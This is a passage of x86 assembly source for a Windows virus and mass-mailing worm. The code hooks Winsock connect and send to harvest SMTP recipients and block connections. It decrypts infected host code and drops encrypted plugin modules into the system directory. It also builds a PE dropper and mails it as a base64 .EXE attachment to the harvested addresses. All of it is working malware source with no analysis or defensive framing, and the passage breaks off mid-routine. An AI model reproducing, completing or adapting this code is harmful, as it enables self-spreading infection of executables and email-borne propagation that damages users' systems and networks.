       xchg ebx, eax
       pop ebp                                 ;ebp=RVA table
       pop ecx                                 ;ecx=number of names
       lodsd
       xchg esi, eax                           ;esi=names table
       xchg esi, ebx                           ;ebx=ordinal table
       neg edx
       sub esi, edx
       sub ebp, edx
       sub ebx, edx                            ;edx=-kernel32
       sub edi, edi
  @@loopy:
       inc edi                                 ;edi=ordinal counter
       lodsd                                   ;eax=API name string
       pusha
       sub eax, edx
       xchg eax, esi
       push CRC_INIT                           ;calculate crc of string
       pop ecx
  @@next_byte:
       lodsb
       test al, al
       jz @@done
       xor cl, al
       mov al, 8
  @@next_bit:
       shr ecx, 1
       jnc @@poly
       xor ecx, CRC_POLY
  @@poly:
       dec al
       jnz @@next_bit
       jmp @@next_byte
  @@done:
       mov esi, [esp+(8*4)+12]                 ;esi==address of API table
       mov edx, [esp+(8*4)+4]                  ;ecx==number of address 2 check
       xchg edx, ecx                           ;edx==CRC of API
  @@check_crc:
       lodsd
       sub eax, edx
       jz @@patch_api                          ;api found
       loop @@check_crc
  @@end_loopy:
       popa
       dec ecx
       jnz @@loopy                             ;all APIs scanned
       ret (4*4)

  @@patch_api:
       dec edi
       movzx eax, wo [ebx+(edi*2)]             ;get ordinal
       mov eax, [ebp+(eax*4)]                  ;get rva
       add eax, [esp+(8*4)+16]
       mov esi, [esp+(8*4)+8]                  ;get result bufer
       dec ecx
       mov [esi+(ecx*4)], eax                  ;patch address into
       jmp @@end_loopy
GetAPI ENDP


dropper equ $
include \dropper.asi


strlen PROC
       push esi
       push eax
       sub ecx, ecx
  @@next:
       lodsb
       test al, al
       jz @@done
       inc ecx
       jmp @@next
  @@done:
       pop eax
       pop esi
       ret
strlen ENDP


include \unpack.asi


_connect PROC
       pushad
       call @@seh
       mov esp, [esp+8]
  @@action:
       pop dwo fs:[0]
       mov dwo [esp], WSAETIMEDOUT      ;WSAECONNREFUSED/WSAENETUNREACH
       call delta
       call [ebp+(ofs _WSASetLastError-ofs vstart)]
       popad
       stc
       sbb eax, eax                     ;return error
       ret 4*3
  @@seh:
       sub ebx, ebx
       push dwo fs:[ebx]
       mov dwo fs:[ebx], esp
       mov eax, [esp+8+(8*4)+8]
       mov bx, wo [eax.sin_port]
       push ebx                         ;porta
       mov eax, [eax.sin_addr]
       push eax                         ;ip
       push MT_BLOCKIP
       call load_muazzin
       pop eax                          ;MR_ERROR/MR_OK
       pop ebx
       jc @@go          ;no muazzin did our request
       test eax, MR_ERROR
       jnz  @@action                    ;block action requested
  @@go:
       pop dwo fs:[0]
       pop eax
       popad
__oldconnect:
       db 0e9h
oldconnect dd 0
_connect ENDP


rnd    PROC
       push ebp ecx edx
       mov eax, CRC_POLY
  pseed equ dwo $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       call delta
       mov [ebp+(ofs pseed-ofs vstart)], eax
       mov ecx, [esp+(4*3)+4]
       sub edx, edx
       div ecx
       xchg eax, edx                           ;value = rnd MOD limit
       pop edx ecx ebp
       ret 4
rnd    ENDP


include \muazzin\sign\rsa\rsalib.asi


_send  PROC
       call @@seh
       mov esp, CRC_POLY
  @@saveesp equ dwo $-4
       jmp @@action
  @@seh:
       push dwo fs:[0]
       mov dwo fs:[0], esp
       pushad
       call delta
       mov [ebp+(ofs @@saveesp-ofs vstart)], esp
       push (size sockaddr_in)
       pop edi
       sub esp, edi
       mov eax, esp
       push edi
       push esp
       push eax
       push dwo [esp+(18*4)]
       call [ebp+(ofs _getpeername-ofs vstart)]
       pop eax
       movzx eax, wo [esp.sin_port]
       add esp, edi
       sub ah, 25                      ;sending to SMTP
       jnz @@action
       mov esi, [esp+(8*4)+(3*4)+4]
       mov ebp, esi
       mov eax, [esp+(8*4)+(3*4)+8]
       sub eax, edi                 ;send too small to have anything useful
       jbe @@action
       lodsd
       and eax, not 20202020h
       xor eax, "TPCR"
       lodsd
       jnz @@action
       and eax, not 00202000h
       xor eax, ":OT "
       jnz @@action                    ;RCPT TO:
       lodsb
       push esi
       call add_queue           ;save recipient
  @@action:
       popad
       pop dwo fs:[0]
       pop eax
__oldsend:
       db 0e9h
oldsend dd 0
_send  ENDP


wsockAPI:
       crc <WSASetLastError>
       crc <WSAGetLastError>
       crc <getpeername>
       crc <gethostbyname>
       crc <closesocket>
       crc <socket>
       crc <WSACleanup>
       crc <WSAStartup>
       crc <connect>
       crc <recv>
       crc <send>
       crc <gethostname>
API_NUMB2 equ ($-wsockAPI)/4

_gethostname   dd CRC_POLY
_send2         dd CRC_POLY
_recv2         dd CRC_POLY
_connect2      dd CRC_POLY
_WSAStartup    dd CRC_POLY
_WSACleanup    dd CRC_POLY
_socket        dd CRC_POLY
_closesocket   dd CRC_POLY
_gethostbyname dd CRC_POLY
_getpeername   dd CRC_POLY
_WSAGetLastError dd CRC_POLY
_WSASetLastError dd CRC_POLY


_DllMain PROC
       cmp dwo [esp+8], 1                       ;DLL_PROCESS_ATTACH
       je @@attach
       cmp dwo [esp+8], 0                       ;DLL_PROCESS_DEATTACH
       je @@deattach
  @@pass:
       db 0e9h
  olddllmain dd 0                 ;call old Dll main
       push 1
       pop eax
       ret 3*4

  @@attach:
       pushad

       call delta
       mov edi, ebp
       sub edi, CRC_POLY
  sect_addy equ dwo $-4
       mov ebx, edi
       add edi, CRC_POLY
  host_rva equ dwo $-4
       mov ecx, CRC_POLY
  host_size equ dwo $-4

       pushad

       push CRC_POLY
  kernel32 equ dwo $-4
       lea eax, [ebp+(ofs resAPI-ofs vstart)]
       push eax
       add eax, API_NUMB*4
       push eax
       push API_NUMB                    ;get apis kernel32
       call GetAPI

       push   "LL"
       push "D.23"
       push "_2SW"
       push esp
       call delta
       call [ebp+(ofs _LoadLibraryA-ofs vstart)]
       add esp, 4*3
       mov [ebp+(ofs dllhandle-ofs vstart)], eax
       push eax
       lea eax, [ebp+(ofs wsockAPI-ofs vstart)]
       push eax
       add eax, API_NUMB2*4
       push eax
       push API_NUMB2                    ;get apis wsock32
       call GetAPI
       popad

       jecxz @@skip_decrypt

       cmp dwo [edi], 12345678h
  orig4 equ dwo $-4
       je @@skip_decrypt

       mov esi, ecx
       shl ecx, 2
       push 0
       push esp
       push 0
       push esp
       push PAGE_READWRITE
       push ecx
       push edi
       call [ebp+(ofs _GetCurrentProcess-ofs vstart)]
       mov [ebp+(ofs @@process-ofs vstart)], eax
       xchg ebp, [ebp+(ofs _VirtualProtectEx-ofs vstart)]
       push eax
       mov ebx, ecx
       call ebp
       push ebx
       push edi
       push 07fffffffh
  @@process equ dwo $-4
       mov eax, CRC_POLY
  host_key equ by $-4
       xchg ecx, esi
  @@decrypt:
       sub by [edi], al                    ;decrypt host code
       ror eax, 8
       scasb
       loop @@decrypt
       call ebp                              ;restore memory protection
       pop ebp
       call delta
  @@skip_decrypt:

       push 32*8
       push 40h
       call [ebp+(ofs _GlobalAlloc-ofs vstart)]
       mov [ebp+(ofs cache_table-ofs vstart)], eax

       call [ebp+(ofs _GetTickCount-ofs vstart)]
       mov [ebp+(ofs pseed-ofs vstart)], eax    ;init rnd seed
       sub ecx, ecx
       push 32
       call rnd                                 ;init retrieve order
       xchg eax, ecx
       ror dwo [ebp+(ofs nameseed-ofs vstart)], cl

       mov eax, 32*12
       call shared_alloc_unnamed
       mov [ebp+(ofs muazzin_table2-ofs vstart)], ecx
       push eax
       mov [ebp+(ofs muazzin_table-ofs vstart)], eax
       add eax, 32*12
       call enum_muazzins

       mov ebx, [ebp+(ofs vsize-ofs vstart)]
       add ebx, ebp
  @@alreadydropped:
       sub ebx, 12                      ;menum_sizeof in virus (reduced)
       mov edx, ebx
       mov edi, [edx+8]         ;get size
       sub ebx, edi                     ;ebx==next header+12
       inc edi
       jz @@eggs_dropped                ;we reach the end of to-drop list?
       push 32
       dec edi
       pop ecx
       mov esi, [ebp+(ofs muazzin_table-ofs vstart)]
  @@searchservermuazzin:
       mov eax, [edx]
       cmp [esi+menum_type], eax           ;already have one this type?
       jne @@namenomatch
       mov eax, [edx+4]
       cmp [esi+menum_version], eax       ;version installed is same or above?
       jae @@alreadydropped
       pushad
       add esp, -0e4h           ;muazzin of same type, but early version exists
       push esp
       mov by [ebp+(ofs name_index-ofs vstart)], cl
       call get_name
       push esp
       call [ebp+(ofs _DeleteFileA-ofs vstart)]         ;delete old version
       sub esp, -0e4h
       popad
  @@namenomatch:
       add esi, menum_sizeof
       loop @@searchservermuazzin
       push 32
       pop ecx
       sub esp, 139h
  @@next_name:
       push esp
       call get_name
       push esp
       call [ebp+(ofs _GetFileAttributesA-ofs vstart)]
       inc eax
       jz @@freename                            ;hereïs a free muazzin name
       inc by [ebp+(ofs name_index-ofs vstart)]
       loop @@next_name
       jmp @@bahh                             ;all names used?

  @@freename:
       pushad
       push eax
       mov eax, esp
       push 0
       push eax    ;tmp
       push edi    ;size
       sub edi, edi
       push ebx    ;buffer
       lea esi, [esp+4*5+8*4]
       push edi
       push FILE_ATTRIBUTE_NORMAL
       push CREATE_ALWAYS
       push edi
       push edi
       push GENERIC_READ+GENERIC_WRITE
       push esi
       call [ebp+(ofs _CreateFileA-ofs vstart)]
       mov ebx, eax
       push ebx
       call [ebp+(ofs _WriteFile-ofs vstart)]   ;write muazzin
       push ebx
       call [ebp+(ofs _CloseHandle-ofs vstart)]
       mov eax, [ebp+(ofs muazzin_table-ofs vstart)]
       xchg eax, [esp]
       call enum_muazzins                           ;update tables
       popad
  @@bahh:
       sub esp, -139h
       jmp @@alreadydropped

  @@eggs_dropped:
       lea esi, [ebp+(ofs vname-ofs vstart)]
       sub edi, edi
       push esi
       push edi
       push FILE_MAP_WRITE
       call [ebp+(ofs _OpenFileMappingA-ofs vstart)]
       test eax, eax
       jnz @@init_email_mem           ;dropper already exists in mem

       mov ecx, esi
       mov eax, 16
       call shared_alloc_named          ;create dropper in mem
       xchg edi, ecx
       mov [eax], ecx             ;zero chainlist
       jmp @@cont

  @@init_email_mem:
       xchg edi, eax
       push 16                  ;size of map
       push eax
       push eax
       push FILE_MAP_WRITE
       push edi
       call [ebp+(ofs _MapViewOfFile-ofs vstart)]
       test eax, eax
       jz @@pass1

  @@cont:
       mov [ebp+(ofs _queue2-ofs vstart)], edi
       mov [ebp+(ofs _queue1-ofs vstart)], eax          ;values for late free

       lea eax, [ebp+(ofs mname-ofs vstart)]
       sub edi, edi
       push eax
       push edi
       push FILE_MAP_WRITE
       call [ebp+(ofs _OpenFileMappingA-ofs vstart)]
       test eax, eax
       jnz @@no_first           ;dropper already exists in mem

       push dwo [ebp+(ofs vsize-ofs vstart)]

       lea ecx, [ebp+(ofs mname-ofs vstart)]
       mov eax, MAXDROPPERSIZE*1024+4
       call shared_alloc_named          ;create dropper in mem
       mov [ebp+(ofs _dropper2-ofs vstart)], ecx
       add al, 4
       mov [ebp+(ofs _dropper1-ofs vstart)], eax
       push eax
       push eax
       lea eax, [ebp+(ofs dropper-ofs vstart)]
       push eax
       call _aP_depack_asm                     ;unpack dropper data
       mov esi, ebp
       pop edi

       push esi
       call full_moon
       jc @@dis_size

       ;;; sÆo os efeitos dos erros da lua
       ;;; ela se aproxima demais da terra, e enlouquece os homens

       mov eax, [ebp+(ofs vsize-ofs vstart)]
  @@find_end:
       add esi, eax
       mov eax, [esi-4]
       inc eax
       jz @@end_found
       add eax, 10
       not eax
       jmp @@find_end
  @@end_found:
       mov eax, esi
       sub eax, [esp]
       mov [ebp+(ofs vsize-ofs vstart)], eax

       push 48*1024
       push 40h
       call [ebp+(ofs _GlobalAlloc-ofs vstart)]
       test eax, eax                   ;error - virus without muazzins
       jz @@dis_size
       push edi
       bts ebp, 31              ;use highgest bit as marker 4 buffer allocated
       xchg eax, edi
       mov esi, edi
       xchg esi, [esp+4]
SHIFT_MARK = not (1 shl 31) - 1
       mov ecx, [ebp+((ofs vsize-ofs vstart)+SHIFT_MARK)]
       rep movsb

       push 32
       push 255
       pop edx
       movzx eax, by [ebp+((ofs minst-ofs vstart)+SHIFT_MARK)]
       shl eax, 1
       sub edx, eax                     ;edx=percentage to add
       mov esi, [ebp+((ofs muazzin_table-ofs vstart)+SHIFT_MARK)]
       pop ecx
       mov ebx, ecx
  @@next_muazzin:
       cmp by [esi+menum_type], bh               ;0
       je @@no_exist
       push -1
       call rnd
       cmp al, dl
       jae @@no_exist

       pushad
       sub ebx, ecx
       mov ecx, ebx
       sub esp, MAX_PATH
       push esp
       call get_name_index
       mov edx, esp

       sub ebx, ebx
       push ebx
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push ebx
       push FILE_SHARE_READ
       push GENERIC_READ
       push edx
       call [ebp+((ofs _CreateFileA-ofs vstart)+SHIFT_MARK)]
       mov ebx, eax
       inc eax
       jz @@error_attach
       push 0
       push ebx
       call [ebp+((ofs _GetFileSize-ofs vstart)+SHIFT_MARK)]
       mov ecx, eax
       jecxz @@error_attach_close

       mov edx, [esp+MAX_PATH+8*4+4]
       add eax, [edx+(ofs vsize-ofs vstart)]
       cmp eax, 32*1024
       ja @@error_attach_close
       add eax, 12                      ;sizeof entry in virus
       mov [edx+(ofs vsize-ofs vstart)], eax
       mov [ebp+((ofs vsize-ofs vstart)+SHIFT_MARK)], eax

       push eax
       mov eax, esp
       push 0
       push eax         ;num read
       push ecx         ;num2read
       push edi         ;buffer
       add edi, ecx
       push ebx         ;handle
       call [ebp+((ofs _ReadFile-ofs vstart)+SHIFT_MARK)]
       mov eax, [esi+4]
       stosd                    ;type
       mov eax, [esi+8]
       stosd                    ;version
       pop eax
       stosd                    ;size

  @@error_attach_close:
       push ebx
       call [ebp+((ofs _CloseHandle-ofs vstart)+SHIFT_MARK)]

  @@error_attach:
       add esp, MAX_PATH
       mov [esp], edi
       popad
  @@no_exist:
       sub esi, -menum_sizeof
       dec ecx
       jnz @@next_muazzin

  @@stopbyhere:
       pop edi
       mov eax, [ebp+((ofs vsize-ofs vstart)+SHIFT_MARK)]
;       jmp @@size_changed
       mov ecx, CRC_POLY
     org $-3
  @@dis_size:
       mov eax, [ebp+(ofs vsize-ofs vstart)]
;  @@size_changed:
       mov ecx, eax
       pop esi

       mov ebx, edi
       add edi, FILE_POS
       push edi
       rep movsb
       mov dwo [ebx+FILE_POS+patch_ofs], 0ff2434ffh
       mov dwo [ebx+FILE_POS+patch_ofs+4], 074c22434h

       btr ebp, 31
       pushad
       jnc @@no_moon_effect
       sub esi, eax
       push esi                         ;free buffer
       call [ebp+(ofs _GlobalFree-ofs vstart)]
  @@no_moon_effect:
       popad

       add edi, 01ffh
       and edi, not 01ffh
       mov edx, [esp]
       lea esi, [edx+0fc00h]
       add edi, 4
       push edi
       sub edi, edx
       xchg edx, edi                    ;edx=size, file aligned
       mov [ebx.NT_OptionalHeader.OH_SizeOfCode+80h], edx
       mov [ebx+SIZE IMAGE_NT_HEADERS+80h+SH_SizeOfRawData], eax
       add edx, 200h                       ;add header
       mov [ebx+SIZE IMAGE_NT_HEADERS+80h+SH_PointerToRawData+40], edx
       lea eax, [edx+200h]
       mov [ebx-4], eax
       mov [ebp+(ofs _droppersize-ofs vstart)], eax
       add edx, 00fffh-200h
       and edx, not 0fffh               ;edx=size, mem aligned
       lea eax, [edx+1008h]
       mov [ebx+80h+NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress], eax
       mov [ebx+SIZE IMAGE_NT_HEADERS+80h+SH_VirtualSize], edx
       add edx, 1000h
       mov [ebx+SIZE IMAGE_NT_HEADERS+80h+SH_VirtualAddress+40], edx
       add edx, 1000h
       mov [ebx.NT_OptionalHeader.OH_SizeOfImage+80h], edx
       add edx, -(012000h)
       add [esi+0], edx
       add [esi+8], edx                 ;update importtable
       add [esi+14h], edx
       add [esi+18h], edx
       add [esi+30h], edx
       push 01ffh
       pop ecx
       pop edi
       rep movsb                        ;copy import table
       pop esi
       add eax, 4ch-8+0400000h
       mov [esi+(ofs rva_import-ofs vstart)], eax
       add eax, -4ch
       mov [esi+(ofs rva_import-ofs vstart)+6], eax

       sub esi, -(ofs rnd_name1-ofs vstart)
       inc by [esi+(ofs generation-ofs vstart)-(ofs rnd_name1-ofs vstart)]
       call @@changename
       sub esi, -(ofs rnd_name2-ofs rnd_name1)
       call @@changename
       add esi, (ofs vname-ofs rnd_name2)
       call @@changename
       lodsd
       call @@changename
       push -1                ;init name generator
       call rnd
       mov [esi+((ofs nameseed-ofs vstart)-(ofs mname-ofs vstart))], eax

       pop dwo [ebp+(ofs vsize-ofs vstart)]

       push dwo [ebp+(ofs _dropper1-ofs vstart)]
       push MT_PROCESSDROPPER
       call load_muazzin                ;end with MR_OK/MB_ERROR
       pop eax

  IF DEBUG EQ TRUE
       pushad
       sub edi, edi
       push edi
       push FILE_ATTRIBUTE_NORMAL
       push CREATE_ALWAYS
       push edi
       push edi
       push GENERIC_READ+GENERIC_WRITE
       call @@nome
       db "\dump.exe", 0                   ;dump dropperz after muazzinz
  @@nome:
       call [ebp+(ofs _CreateFileA-ofs vstart)]
       mov ebx, eax
       inc eax
       jz @@error
       push ebx
       push eax
       mov eax, esp
       push 0
       push eax
       push dwo [ebp+(ofs _droppersize-ofs vstart)]
       push dwo [ebp+(ofs _dropper1-ofs vstart)]
       push ebx
       call [ebp+(ofs _WriteFile-ofs vstart)]
       pop eax
       call [ebp+(ofs _CloseHandle-ofs vstart)]
  @@error:
       popad
  ENDIF
       jmp @@continue

  @@changename:
       push -1
       call rnd
       add [esi], eax
       and [esi], 0f0f0f0fh
       add [esi], "AAAA"
       ret

  @@no_first:
       mov [ebp+(ofs _dropper2-ofs vstart)], eax
       push MAXDROPPERSIZE*1024+4
       push edi
       push edi
       push FILE_MAP_WRITE
       push eax
       call [ebp+(ofs _MapViewOfFile-ofs vstart)]
       test eax, eax
       jz @@pass1
       mov esi, eax
       lodsd
       mov [ebp+(ofs _dropper1-ofs vstart)], esi
       mov [ebp+(ofs _droppersize-ofs vstart)], eax

  @@continue:
       call full_moon
       jc @@no_night
       lea eax, [ebp+(ofs Thr_Breed-ofs vstart)]
       push eax                                ;a lunar event
       call InstallThread
  @@no_night:
       lea eax, [ebp+(ofs Thr_Bloom-ofs vstart)]
       push eax                                ;always fertile
       call InstallThread

       lea eax, [ebp+(ofs EmailThread-ofs vstart)]
       push eax
       call InstallThread               ;email sending thread

       sub ebp, -(ofs MainMuazzinThread-ofs vstart)
       push ebp
       call InstallThread               ;muazzin exec thread
  @@pass1:
       popad
       jmp @@pass

  @@deattach:
       pushad
       call delta
       xchg esi, ebp
       add esi, (ofs _dropper1-ofs vstart)
       push CRC_POLY
  _dropper2 equ dwo $-4
       add dwo [esi], -4
       push dwo [esi]
       call shared_free                 ;free dropper

       push CRC_POLY
  _queue2 equ dwo $-4
       push CRC_POLY
  _queue1 equ dwo $-4
       call shared_free                 ;free queue email

       call delta
       push CRC_POLY
  dllhandle equ dwo $-4
       call [ebp+(ofs _FreeLibrary-ofs vstart)]

       push CRC_POLY
  muazzin_table2 equ $-4
       push dwo [ebp+(ofs muazzin_table-ofs vstart)]
       call shared_free

       mov esi, [ebp+(ofs cache_table-ofs vstart)]
       push esi
       push 32
       pop ecx
  @@free:
       lodsd
       mov edx, eax
       lodsd
       test edx, edx
       jz @@skipz
       push eax
       push edx
       call shared_free                 ;free shared memblockz
  @@skipz:
       loop @@free
       call [ebp+(ofs _GlobalFree-ofs vstart)]
       jmp @@pass1
_DllMain ENDP


reproduce PROC
       pushad
       call delta
       push SLEEP_APPZ/2
       call [ebp+(ofs _Sleep-ofs vstart)]
       lea eax, [ebp+(ofs get_name_index-ofs vstart)]
       push eax
       push dwo [ebp+(ofs muazzin_table-ofs vstart)]
       push dwo [esp+3*4+8*4]
       call load_muazzin                        ;bloom/breed
       pop eax eax
       popad
       ret 4
reproduce ENDP


get_name_nopath PROC
       stc
       pushad
       cmp ax, 1234h
     org $-2
get_name_nopath ENDP


get_name PROC
       pushad
 __1:
       clc
       mov edi, [esp+4+(8*4)]                  ;buffer
       jc @@skip_path
       push MAX_PATH
       push edi
       call delta
       call [ebp+(ofs _GetSystemDirectoryA-ofs vstart)]
       add edi, eax
  @@skip_path:
       mov cl, 12h                             ;name variantz (1-32)
  name_index equ by $-1
       db 0bah                                 ;name seed (setted by parent)
  nameseed dd CRC_POLY
       ror edx, cl                             ;choose name variant
       push 12
       pop ecx
       mov al, "\"
       stosb
       mov eax, ecx
  @@digit:
       mov al, dl
       and al, 0fh
       add al, "A"
       stosb                                   ;build name
       rol edx, 4
       loop @@digit
       call sbox
       mov [edi], cl                           ;set 0
       mov by [edi-4], "."                     ;set .
       popad
       ret 4
get_name ENDP


EmailThread PROC
       pushad

       push 128*1024
       push 40h
       call delta
       call [ebp+(ofs _GlobalAlloc-ofs vstart)]
       test eax, eax
       jz @@done

       push eax         ;buffer addy            ;BUFFER-> MUAZZIN TEXT
       sub ecx, ecx
       mov dwo [eax+mtext_headers], ecx               ;BUFFER+30kb-> SEND BUFFER
       mov edx, [ebp+(vname-ofs vstart)+2]
       mov [eax+mtext_exename], edx
       mov edx, [ebp+(vname-ofs vstart)]
       mov [eax+mtext_exename+4], edx
       mov [eax+mtext_exename+8], "EXE."
       mov [eax+mtext_exename+12], ecx                ;BUFFER+62kb-> EXE NAME

       push eax
       push MT_GENTEXT
       call load_muazzin
       pop eax

       sbb ecx, ecx     ;ecx=-1         - ERROR
       push ecx         ;ecx=0          - OK

       mov edi, [esp+4]
       add edi, mtext_boundary

       push 30
       call rnd
       mov ecx, "FJ--"
       xchg ecx, eax
       stosd
       add cx, 5
  @@next_sign:
       push 36
       call rnd                                 ;BUFFER+29kb-> BOUNDARY
       cmp al, 26
       jb @@letter
       add al, "0"-26
       cmp ax, ?
     org $-2
  @@letter:
       add al, "A"
  @@fine:
       stosb
       loop @@next_sign                 ;edi+16kb = boundary
       mov eax, ecx
       stosd

       mov esi, [esp+4]
       add esi, mtext_headers
       mov eax, [esp]
       test eax, eax
       jnz @@no_sender                  ;skip sender info(no muazzin)
  @@search0:
       lodsb
       test al, al
       jnz @@search0
       dec esi
  @@no_sender:
       mov edi, esi
       call @@over001
       db "MIME-Version: 1.0",13,10
       db "Content-Type: multipart/mixed; boundary=""",0
  @@over001:
       pop esi
       call @@zopy                              ;create Mime intro
       call @@boundary1
       dec edi
       dec edi
       mov eax, 0a0d00h+""""
       stosd
       dec edi
       call @@boundary                          ;set first boundary
       mov eax, [esp]
       test eax, eax
       jnz @@notext                             ;no muazzin, empty text

       call @@text0022
       db "Content-Type: text/plain; charset=""us-ascii""",13,10,13,10,0
  @@text0022:
       pop esi
       call @@zopy
       mov esi, [esp+4]
       call @@zopy
       mov ax, 0a0dh
       stosw
       call @@boundary                          ;end text section

  @@notext:
       call @@text0001
       db "Content-Type: application/octet-stream; name=""", 0
  @@text0001:
       pop esi
       call @@zopy
       mov esi, [esp+4]
       add esi, mtext_exename
       call @@zopy                              ;copy EXE name
       call @@text0002
       db """",13,10,"Content-Transfer-Encoding: base64",13,10
       db "Content-Disposition: attachment; filename=""", 0
  @@text0002:
       pop esi
       call @@zopy
       mov esi, [esp+4]
       add esi, mtext_exename
       call @@zopy                              ;copy EXE name
       mov al, """"
       stosb
       mov eax, 0a0d0a0dh
       stosd
       call delta
       mov eax, [ebp+(ofs _droppersize-ofs vstart)]
       mov esi, [ebp+(ofs _dropper1-ofs vstart)]
       call BASE64
       add edi, ecx
       call @@boundary                          ;last boundary
       mov dwo [edi-2], 0a0d0000h+"--"
       mov dwo [edi+2], 0
       pop eax
       sub dwo [esp], -mtext_headers

IF DEBUG EQ TRUE
       pushad
       mov esi, [esp+8*4]
       call strlen
       mov edi, ecx
       call delta
       sub eax, eax
       push eax
       push FILE_ATTRIBUTE_NORMAL
       push CREATE_ALWAYS
       push eax
       push eax
       push GENERIC_READ+GENERIC_WRITE
       call @@nome
       db "\dump.000", 0
  @@nome:
       mov eax, [esp]
       inc by [eax+6+2]
       cmp by [eax+6+2], "9"
       jbe @@zk1
       mov by [eax+6+2], "0"
       inc by [eax+6+1]
       cmp by [eax+6+1], "9"
       jbe @@zk1
       mov by [eax+6+1], "0"
       inc by [eax+6]
  @@zk1:
       call [ebp+(ofs _CreateFileA-ofs vstart)]
       mov ebx, eax
       inc eax
       jz @@error11
       push ebx
       push eax
       mov eax, esp
       push 0
       push eax
       push edi
       push esi
       push ebx
       call [ebp+(ofs _WriteFile-ofs vstart)]
       pop eax
       call [ebp+(ofs _CloseHandle-ofs vstart)]
  @@error11:
       popad
ENDIF

  @@mailoop:                            ;[esp]=data buffer
       pushad
       call delta
       push 101h
       sub eax, eax
       pop esi

       call CheckInet           ;are we connected?
       jc @@sleep0

       sub esp, esi             ;esi=101h
       push esp
       push esi
       call [ebp+(ofs _WSAStartup-ofs vstart)]          ;init inet
       test eax, eax
       jnz @@sleep1
       push esp
       call get_queue
       cmp by [esp], 0                  ;no email in queue
       je @@sleep2

       mov esi, esp

       call strlen
       push 0
       push ecx
       push esi
       call crc32
       push 0           ;CHECK4LIST
       push eax
       call list_manager  ;dis email address was already contacted?
       jc @@sleep2
       push 1           ;ADD2LIST
       push eax
       call list_manager

       push dwo [esp+(8*4)+101h];email data
       push esi                 ;to:
       call sendmail
  @@sleep2:
       call [ebp+(ofs _WSACleanup-ofs vstart)]
  @@sleep1:
       add esp, 101h
  @@sleep0:
       push 1*60*1000           ;sleepz 1 minute
       call [ebp+(ofs _Sleep-ofs vstart)]
       popad
       jmp @@mailoop

  @@zopy:
       lodsb
       test al, al
       jz @@done111222
       stosb
       jmp @@zopy
  @@done111222:
       ret

  @@boundary:
       mov eax, 02d2d0a0dh
       stosd
  @@boundary1:
       push esi ecx
       mov esi, [esp+4+4+8]
       sub esi, -(mtext_boundary)
       call @@zopy
       mov ax, 0a0dh
       stosw
       pop ecx esi
       ret

  @@done:
       popad
       ret 4
EmailThread ENDP


get_queue PROC
       pushad
       call delta
  @@wait:
       mov ecx, dwo [ebp+(ofs into-ofs vstart)]
       jecxz @@wait
       dec dwo [ebp+(ofs into-ofs vstart)]
       mov edi, [esp+(9*4)]
       mov esi, [ebp+(ofs _queue1-ofs vstart)]
       mov eax, [esi]
       test eax, eax
       jz @@error                       ;list is empty
       push eax
       push eax
       call [ebp+(ofs _IsBadCodePtr-ofs vstart)]
       test eax, eax
       pop eax
       jnz @@error
       mov eax, [eax]
       xchg eax, [esi]
       mov esi, eax
       lodsd                    ;ptr2prev
       push eax
       lodsd                    ;handle2
       xchg [esp], eax
       push eax                 ;fix order
       call strlen
       rep movsb
       xchg eax, ecx
       call shared_free
  @@error:
       stosb                               ;nul
       inc dwo [ebp+(ofs into-ofs vstart)]
       popad
       ret 4
get_queue ENDP


include \muazzin\muazzin.asi


load_muazzin PROC
       pushad
       call delta
       sub ecx, ecx

       push 00ffff10h     ;null/stc/jmp/mr_done

       mov esi, CRC_POLY
    muazzin_table equ dwo $-4
       sub esp, (MAX_PATH+15)
       mov edx, esp
  @@request:
       lodsd                   ;search table for a muazzin that can do request
       test eax, [esp+(8*4)+4+(MAX_PATH+15)+4]
       jnz @@do
  @@done1:
       add esi, 8
       inc cl
       cmp cl, 32
       jb @@request
       sub esp, -(MAX_PATH+15)

       pop eax
       inc ah
       jz @@skip_outcode
       movzx ecx, al
       mov [esp+(8*4)+8], ecx
  @@skip_outcode:
       shr eax, 16
       inc al
       jz @@stc
       test al, 12
     org $-1
  @@stc:
       stc
       popad
       ret 4

       sub eax, CRC_POLY
     org $-4

  @@do:
       push edx ecx esi
       mov by [ebp+(ofs name_index-ofs vstart)], cl     ;name_index
       push edx              ;name
       push edx
       call get_name
       call map_decrypt_muazzin      ;decrypt muazzin
       pop esi ecx edx
       jc @@done1

       mov by [esp+(MAX_PATH+15)+2], 0          ;muazzin will execute

       mov eax, [esp+(8*4)+(MAX_PATH+15)+4+4]   ;edx=name/ebp=delta/edi=entry

       pushad
       call @@seh
       mov esp, CRC_POLY
  @@save_esp equ dwo $-4
       or dwo [esp.m_result], MR_SEH            ;signal gpf ocurred
       jmp @@action
  @@seh:
       push dwo fs:[0]
       mov dwo fs:[0], esp
       add esp, -(size_muazzin_struc)
       mov [ebp+(ofs @@save_esp-ofs vstart)], esp

       mov [esp.m_why], eax
       test eax, MT_BREED
       jnz @@doit
       test eax, MT_BLOOM
       jnz @@doit
       test eax, MT_BLOCKIP
       jz @@zkip
  @@doit:
       mov eax, [esp+(8*4)+(8*4)+8+(3*4)+(size_muazzin_struc)+(MAX_PATH+15)+4]
       mov [esp.m_port], eax                      ;param2
       jmp @@skip2
  @@zkip:
       mov eax, CRC_POLY
  _droppersize equ dwo $-4
       mov [esp.m_droppersize], eax
  @@skip2:
       mov eax, [esp+(8*4)+(8*4)+8+(2*4)+(size_muazzin_struc)+(MAX_PATH+15)+4]
       mov [esp.m_dropper], eax                   ;param1==dropper/buffer/ip

       mov eax, [ebp+(ofs _GetModuleHandleA-ofs vstart)]
       mov [esp.GMH], eax
       mov eax, [ebp+(ofs _GetProcAddress-ofs vstart)]
       mov [esp.GPA], eax

       push esp
       call edi

  @@action:
       call delta
       mov eax, [esp.m_result]

       test al, MR_SKIPSEH
       jnz @@seh_check
       test al, MR_SEH                  ;if a fault occured, and the muazzin
       jz @@seh_check                   ;dont warned about this possibility,
       or al, MR_DELETE                 ;delete it
  @@seh_check:

       test al, MR_INVALID             ;invalid, no more processing
       jnz @@noerr

       test al, MR_OK       ;if routine dont support extra param, muazzin
       jz @@nook            ;should end with MR_DONE

       cmp by [esp+(MAX_PATH+15)+8*4+2*4+(size_muazzin_struc)], MR_ERROR
       je @@skip_set                  ;already set, skip
       mov by [esp+(MAX_PATH+15)+8*4+2*4+(size_muazzin_struc)], MR_OK
  @@skip_set:

